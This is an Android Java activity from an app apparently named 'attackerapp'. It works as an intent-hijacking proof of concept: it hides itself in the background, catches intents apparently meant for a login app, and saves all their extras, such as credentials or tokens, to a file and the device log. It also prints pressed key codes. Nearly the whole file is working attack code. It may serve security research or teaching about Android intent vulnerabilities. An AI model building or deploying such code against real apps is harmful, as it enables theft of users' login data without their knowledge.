package com.zombie.attackerapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

import com.example.hijacker.Utils;

import java.util.Iterator;

public class MainActivity extends AppCompatActivity {
    private TextView Textv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);


    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);

    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Bundle b = intent.getExtras();

        if (b != null) {
            try {
                JSONObject bundleJSON = bundleToJSON(b);

                //PRINT BUYNDLE DATA
                try { System.out.print(bundleJSON.toString(4));
                } catch (JSONException e) {}

                //WRITE TO FILES DIR
                Utils.writeJSONToFilesDir(getApplicationContext(), "login_app_intents.json", bundleJSON);

            } catch(JSONException e) {

                }
            //DEVIE FILE EXPLORER => DATA => DATA => COM.EXAMPLE.ATTACKERAPP => FILES => login_app_intents.json
        }

    }

    public JSONObject bundleToJSON(Bundle b){
        JSONObject bundle = new JSONObject();
        for (String key : b.keySet()) {
            Log.i("BundleContents", key + " " + b.get(key));
            try {
                JSONObject jo = new JSONObject((String) b.get(key));

                for (Iterator<String> it = jo.keys(); it.hasNext(); ) {
                    String jsonKey = it.next();
                    bundle.put(jsonKey, jo.get(jsonKey));
                }
            } catch (JSONException e1) {
                try {
                    bundle.put(key, b.get(key));
                } catch(JSONException e2) { Log.i("BundelToJSON", "Cannot write JSON"); }
            }
        }
        Log.i("BundleContents", bundle.toString());

        return bundle;
    }
    @Override
    public boolean onKeyDown(int key, KeyEvent keyEvent){
        System.out.println(keyEvent.getKeyCode());
        return false;
    }
}